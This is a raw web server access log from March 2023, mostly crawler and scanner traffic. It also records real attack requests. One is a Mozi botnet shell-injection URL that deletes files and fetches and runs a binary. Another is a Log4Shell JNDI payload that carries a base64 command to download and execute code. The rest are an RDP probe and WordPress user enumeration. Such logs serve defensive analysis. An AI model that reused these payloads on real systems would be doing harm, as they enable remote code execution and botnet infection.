52.167.144.133 - - [23/Mar/2023:00:23:20 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:00:23:22 +0000] "GET / HTTP/1.1" 200 796 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:00:25:32 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
176.113.115.168 - - [23/Mar/2023:00:29:09 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
208.109.34.70 - - [23/Mar/2023:00:32:00 +0000] "GET /wp-login.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
208.109.34.70 - - [23/Mar/2023:00:32:01 +0000] "GET /wp-login.php HTTP/1.1" 404 125 "http://pseudot.org/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
148.72.40.90 - - [23/Mar/2023:00:32:13 +0000] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
49.119.77.45 - - [23/Mar/2023:00:34:40 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 0 "-" "Hello, world"
157.55.39.225 - - [23/Mar/2023:00:52:30 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.220 - - [23/Mar/2023:00:52:39 +0000] "GET / HTTP/1.1" 200 1707 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.239 - - [23/Mar/2023:00:53:34 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
185.142.236.43 - - [23/Mar/2023:00:53:46 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.43 - - [23/Mar/2023:00:53:47 +0000] "GET /robots.txt HTTP/1.1" 200 25 "-" "-"
185.142.236.43 - - [23/Mar/2023:00:53:47 +0000] "GET /sitemap.xml HTTP/1.1" 404 0 "-" "-"
185.142.236.43 - - [23/Mar/2023:00:53:47 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 0 "-" "-"
185.142.236.43 - - [23/Mar/2023:00:53:49 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
185.142.236.43 - - [23/Mar/2023:00:53:50 +0000] "\x03\x1D\xA3\x1Bd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
157.55.39.223 - - [23/Mar/2023:01:22:36 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.223 - - [23/Mar/2023:01:22:37 +0000] "GET /robots.txt HTTP/1.1" 200 95 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.239 - - [23/Mar/2023:01:22:47 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:01:26:01 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
138.246.253.24 - - [23/Mar/2023:01:31:34 +0000] "GET /robots.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
193.32.162.159 - - [23/Mar/2023:01:34:22 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [23/Mar/2023:01:34:32 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [23/Mar/2023:01:55:48 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Hello World"
94.102.61.10 - - [23/Mar/2023:02:00:23 +0000] "GET / HTTP/1.1" 200 415900 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
216.218.206.68 - - [23/Mar/2023:02:13:49 +0000] "GET / HTTP/1.1" 200 239158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
216.218.206.68 - - [23/Mar/2023:02:16:43 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
216.218.206.68 - - [23/Mar/2023:02:17:38 +0000] "GET /geoserver/web/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
54.188.135.217 - - [23/Mar/2023:02:20:23 +0000] "GET / HTTP/1.1" 301 169 "-" "-"
40.77.167.239 - - [23/Mar/2023:02:27:12 +0000] "GET / HTTP/1.1" 200 1010 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:02:27:52 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
188.166.87.67 - - [23/Mar/2023:02:29:37 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 157 "-" "-"
188.166.87.67 - - [23/Mar/2023:02:29:37 +0000] "GET / HTTP/1.1" 200 305246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
45.145.248.35 - - [23/Mar/2023:02:29:56 +0000] "GET / HTTP/1.1" 200 2826140 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//107.189.4.234:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vZDI2ZXhrZmd2eTcyamEuY2xvdWRmcm9udC5uZXQvc3BraTsgY3VybCAtTyBodHRwOi8vZDI2ZXhrZmd2eTcyamEuY2xvdWRmcm9udC5uZXQvc3BraTsgY2htb2QgNzc3IHNwa2k7IC4vc3BraSAy}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//107.189.4.234:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vZDI2ZXhrZmd2eTcyamEuY2xvdWRmcm9udC5uZXQvc3BraTsgY3VybCAtTyBodHRwOi8vZDI2ZXhrZmd2eTcyamEuY2xvdWRmcm9udC5uZXQvc3BraTsgY2htb2QgNzc3IHNwa2k7IC4vc3BraSAy}')"
40.77.167.220 - - [23/Mar/2023:02:33:07 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.191 - - [23/Mar/2023:02:44:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
193.32.162.159 - - [23/Mar/2023:03:06:21 +0000] "GET / HTTP/1.1" 200 415756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [23/Mar/2023:03:06:31 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2001:470:1:332::a - - [23/Mar/2023:03:11:36 +0000] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36"
157.55.39.225 - - [23/Mar/2023:03:18:23 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.225 - - [23/Mar/2023:03:18:23 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.206 - - [23/Mar/2023:03:18:34 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:03:20:23 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:03:20:23 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.208 - - [23/Mar/2023:03:20:32 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
45.128.232.112 - - [23/Mar/2023:03:20:42 +0000] "GET / HTTP/1.1" 200 196449 "-" "Linux Gnu (cow)"
143.110.222.166 - - [23/Mar/2023:03:28:51 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
66.249.64.211 - - [23/Mar/2023:03:36:06 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.198 - - [23/Mar/2023:03:36:07 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.215 - - [23/Mar/2023:03:36:07 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.215 - - [23/Mar/2023:03:36:08 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.192 - - [23/Mar/2023:03:36:09 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.192 - - [23/Mar/2023:03:36:09 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Googlebot-Image/1.0"
157.55.39.208 - - [23/Mar/2023:03:36:44 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.191 - - [23/Mar/2023:03:39:47 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:03:43:12 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:03:43:12 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:03:43:21 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
92.118.39.82 - - [23/Mar/2023:04:07:05 +0000] "GET / HTTP/1.1" 200 124289 "-" "-"
92.118.39.82 - - [23/Mar/2023:04:07:05 +0000] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 0 "-" "Hello World"
40.77.167.220 - - [23/Mar/2023:04:08:47 +0000] "GET / HTTP/1.1" 200 1029 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
198.199.118.163 - - [23/Mar/2023:04:23:23 +0000] "GET /ReportServer HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
192.241.232.14 - - [23/Mar/2023:04:23:29 +0000] "GET /login HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
54.36.148.149 - - [23/Mar/2023:04:24:09 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.12 - - [23/Mar/2023:04:24:10 +0000] "GET /posts/inmultire-de-matrici-folosind-map-reduce/inmultire-de-matrici-folosind-map-reduce.html HTTP/1.1" 200 2625 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [23/Mar/2023:04:25:59 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
40.77.167.94 - - [23/Mar/2023:04:29:25 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.206 - - [23/Mar/2023:04:33:11 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
1.14.92.22 - - [23/Mar/2023:04:33:23 +0000] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:24 +0000] "GET /?author=1 HTTP/1.1" 200 415740 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:26 +0000] "GET /?author=2 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:27 +0000] "GET /?author=3 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:28 +0000] "GET /?author=4 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:28 +0000] "GET /?author=5 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:29 +0000] "GET /?author=6 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:30 +0000] "GET /?author=7 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:30 +0000] "GET /?author=8 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:31 +0000] "GET /?author=9 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:32 +0000] "GET /?author=10 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:33 +0000] "GET /?author=11 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:33 +0000] "GET /?author=12 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:34 +0000] "GET /?author=13 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:35 +0000] "GET /?author=14 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:36 +0000] "GET /?author=15 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:37 +0000] "GET /?author=16 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:37 +0000] "GET /?author=17 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:38 +0000] "GET /?author=18 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:39 +0000] "GET /?author=19 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
1.14.92.22 - - [23/Mar/2023:04:33:40 +0000] "GET /?author=20 HTTP/1.1" 200 416003 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
198.58.122.115 - - [23/Mar/2023:04:33:40 +0000] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 157 "-" "-"
198.58.122.115 - - [23/Mar/2023:04:33:40 +0000] "GET /PdAg HTTP/1.1" 404 0 "-" "Mozilla/5.0"
198.58.122.115 - - [23/Mar/2023:04:33:41 +0000] "GET /P4hq HTTP/1.1" 404 0 "-" "Mozilla/5.0"
172.104.51.254 - - [23/Mar/2023:04:33:41 +0000] "GET /r5Of HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.104.51.254 - - [23/Mar/2023:04:33:42 +0000] "GET /IjFd HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
40.77.167.239 - - [23/Mar/2023:04:37:24 +0000] "GET / HTTP/1.1" 200 587 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
35.241.185.104 - - [23/Mar/2023:04:46:48 +0000] "GET / HTTP/1.1" 200 1583 "-" "python-requests/2.28.2"
138.197.154.105 - - [23/Mar/2023:04:48:21 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
138.246.253.24 - - [23/Mar/2023:04:54:19 +0000] "GET /robots.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "GET / HTTP/1.1" 200 163623 "-" "-"
167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "GET / HTTP/1.1" 200 261994 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.146.58 - - [23/Mar/2023:05:03:39 +0000] "GET /favicon.png HTTP/1.1" 200 17440 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
